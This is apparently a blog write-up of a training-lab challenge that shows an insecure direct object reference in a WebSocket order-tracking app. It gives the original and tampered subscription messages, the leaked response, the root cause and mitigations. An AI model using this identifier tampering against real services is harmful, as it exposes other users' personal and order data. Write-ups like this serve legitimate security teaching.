---
title: "IDOR via WebSocket Subscription – Cross-Order Data Exposure | JoyStick"
date: 2026-05-16 14:30:00 +0530
categories: [Web Security, IDOR]
tags: [idor, websocket, authorization-bypass, sensitive-data-exposure, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/websocket-idor-joystick.webp
  alt: WebSocket order subscription IDOR vulnerability
---

## Overview

JoyStick is a real-time order tracking platform built around live WebSocket updates. The application pushes order state changes instantly without requiring page refresh, which is its core feature.

During testing, the WebSocket subscription mechanism was found to lack proper authorization checks. By modifying the `order_id` parameter in a subscription request, it was possible to access other users' order data.

This resulted in an IDOR (Insecure Direct Object Reference) vulnerability over WebSocket communication.

---

## Objective

To verify whether the WebSocket subscription endpoint properly enforces authorization and prevents users from accessing orders that do not belong to them.

## Lab Link

- Lab: [JoyStick](https://dashboard.webverselabs-pro.com/mystery-challenges/joystick)

---

## Reconnaissance

The WebSocket traffic showed a simple subscription model:

### Client → Server

```json
{"action":"subscribe","order_id":2}
```

### Server → Client

```json
{
  "event": "order.snapshot",
  "order_id": 2,
  "status": "processing",
  "tracking_number": "JS-2026-97591",
  "shipping_name": "kelvin",
  "total_cents": 9999,
  "created_at": "2026-05-17 05:59:51",
  "items": [
    {
      "name": "Echo Stealth Headphones",
      "qty": 1,
      "unit_price_cents": 9999,
      "is_digital": 0,
      "download_key": null
    }
  ]
}
```

At this stage, the system appeared to correctly return only the authenticated user's order.

---

## Exploitation

The subscription request was intercepted and modified in a repeater tool.

### Modified Request

```json
{"action":"subscribe","order_id":1}
```

### Server Response

```json
{
  "event": "order.snapshot",
  "order_id": 1,
  "status": "shipped",
  "tracking_number": "JS-2026-0001",
  "shipping_name": "JoyStick Store",
  "total_cents": 5999,
  "created_at": "2026-05-14 05:59:11",
  "items": [
    {
      "name": "Cyberglade — Digital Edition",
      "qty": 1,
      "unit_price_cents": 5999,
      "is_digital": 1,
      "download_key": "WEBVERSE{....}"
    }
  ]
}
```

This confirmed that the backend was directly trusting the `order_id` parameter without verifying ownership.

---

## Proof of Exploitation

- Changing a single numeric identifier exposed another user's order
- Sensitive metadata was accessible, including:
  - Shipping details
  - Order status history
  - Digital download key
- No session-based ownership validation was enforced at the subscription layer

---

## Impact

This vulnerability allows:

- Unauthorized access to other users' orders
- Exposure of digital product download keys
- Leakage of personal and transactional data
- Potential financial and account abuse depending on order contents

In environments where digital goods are delivered, this can escalate into full content theft.

---

## Root Cause

The WebSocket handler likely maps `order_id` directly to database queries without verifying:

- Whether the authenticated user owns the order
- Whether the subscription request is authorized for that resource

Example flawed logic:

```javascript
fetchOrder(order_id)
```

instead of:

```javascript
fetchOrder(where order_id = X AND user_id = current_user)
```

---

## Mitigation

To prevent this issue:

- Enforce strict authorization checks on every WebSocket message
- Bind subscriptions to authenticated session context
- Never trust client-provided identifiers for sensitive resources
- Validate `order_id` ownership before sending updates
- Add server-side access control middleware for WebSocket events
- Log and monitor cross-account access attempts

---

## Real-World Insight

WebSocket-based applications often shift focus toward performance and real-time updates, but security controls are frequently implemented only at HTTP layer.

This creates a blind spot where:

- REST endpoints may be secure
- WebSocket channels remain unprotected

This lab is a classic example of how authorization logic must be duplicated and enforced consistently across real-time channels.

---

## Lab Link

WebVerse JoyStick – Real-time Order Tracking Lab

---

## Conclusion

A simple parameter tampering issue in a WebSocket subscription flow led to cross-user data exposure. This highlights how real-time systems must treat authorization as a first-class requirement, not an afterthought.